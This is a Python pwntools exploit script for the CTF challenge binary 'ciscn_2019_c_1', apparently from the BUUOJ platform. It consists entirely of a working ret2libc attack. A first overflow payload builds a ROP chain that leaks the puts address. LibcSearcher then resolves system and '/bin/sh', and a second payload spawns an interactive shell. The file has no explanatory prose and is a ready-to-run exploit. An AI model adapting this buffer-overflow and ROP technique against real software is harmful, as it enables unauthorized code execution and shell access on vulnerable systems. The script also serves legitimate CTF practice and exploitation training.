from pwn import*
from LibcSearcher import *
context.log_level = 'debug'
#io = remote("node3.buuoj.cn" , 27728)
elf = ELF("./ciscn_2019_c_1")
io = process("./ciscn_2019_c_1")

puts_plt =elf.plt["puts"]
puts_got= elf.got["puts"]
pop_rid_ret = 0x400c83
main_addr = 0x400b28

io.recvuntil("Welcome to this Encryption machine\n")
io.sendline('1')

payload1 = b"\x00" + b"A"*(80 - 1 + 8) + p64(pop_rid_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.recvuntil("Input your Plaintext to be encrypted")
io.sendline(payload1)

io.recv()
io.recvuntil('\n\n')
puts_addr = io.recvuntil('\n',True)
puts_addr = u64(puts_addr.ljust(8,b'\x00'))
#puts_addr = puts_addr.ljust(8,b'\x00')
print("------------------->",hex(puts_addr))

libc = LibcSearcher('puts',puts_addr)
sys_libc = libc.dump('system')
bin_sh_libc = libc.dump('str_bin_sh')
puts_libc = libc.dump('puts')
retn = 0x4006B9

sys_addr = puts_addr + (sys_libc - puts_libc)
bin_addr = puts_addr + (bin_sh_libc - puts_libc)

io.recvuntil("Welcome to this Encryption machine\n")
io.sendline('1')

io.recvuntil("Input your Plaintext to be encrypted")
payload2 = b"\x00" + b"A"*(80 - 1 + 8) + p64(retn) + p64(pop_rid_ret) + p64(bin_addr) + p64(sys_addr) + b'A'*8
io.sendline(payload2)

io.interactive()